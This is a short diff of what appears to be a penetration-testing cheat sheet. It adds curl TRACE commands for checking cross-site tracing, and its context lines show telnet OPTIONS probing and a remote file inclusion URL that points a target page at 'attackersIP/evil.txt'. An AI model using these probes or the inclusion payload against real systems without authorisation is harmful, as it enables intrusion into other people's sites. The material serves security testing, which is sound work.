@@ -125,6 +125,10 @@ http://localhost/index.php?page=http://attackersIP/evil.txt
 telnet <target IP> 80
 OPTIONS / HTTP/1.0
 (hit enter 2x)
+
+Check for cross-site tracing (XST)
+curl -X TRACE <target>
+curl -X TRACE -H "Cookie: name=value" <target>
 ------------------------------------------------------------------------------------------------------
 
 # WebDAV extensions are enabled
